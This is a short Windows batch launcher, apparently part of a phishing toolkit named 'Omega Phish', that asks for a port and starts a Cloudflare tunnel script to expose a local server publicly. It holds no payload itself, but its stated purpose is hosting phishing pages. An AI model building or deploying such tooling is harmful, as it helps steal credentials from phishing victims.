@echo off
echo ============================================================
echo OMEGA PHISH - CLOUDFLARE TUNNEL
echo ============================================================
echo.
set /p port="Enter port number (press Enter for 8080): "
if "%port%"=="" set port=8080

echo.
echo Starting Cloudflare Tunnel on port %port%...
echo Please wait 5-10 seconds...
echo.

node cloudflare-tunnel.js

pause
